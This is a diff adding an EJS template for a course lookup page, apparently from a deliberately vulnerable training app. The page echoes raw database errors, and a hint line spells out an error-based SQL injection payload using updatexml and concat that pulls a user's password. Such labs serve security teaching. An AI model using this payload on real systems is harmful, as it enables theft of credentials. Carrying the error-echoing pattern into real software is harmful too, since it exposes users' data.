@@ -1,0 +1,21 @@
+<%- include('partials/header') %>
+<h1>Course lookup</h1>
+<form method="get" action="/course" class="form inline-form">
+  <input name="id" placeholder="Course id" value="">
+  <button type="submit">Look up</button>
+</form>
+
+<% if (error) { %>
+  <p class="error">DB error: <%= error %></p>
+<% } else if (course) { %>
+  <div class="card">
+    <h3>#<%= course.id %> — <%= course.name %></h3>
+    <p><%= course.description %></p>
+  </div>
+<% } else { %>
+  <p>No course found.</p>
+<% } %>
+
+<p class="hint">SQLi (intermediate, error-based) target. Vulnerable-mode payload in <code>id</code>:
+<code>1 AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)</code></p>
+<%- include('partials/footer') %>
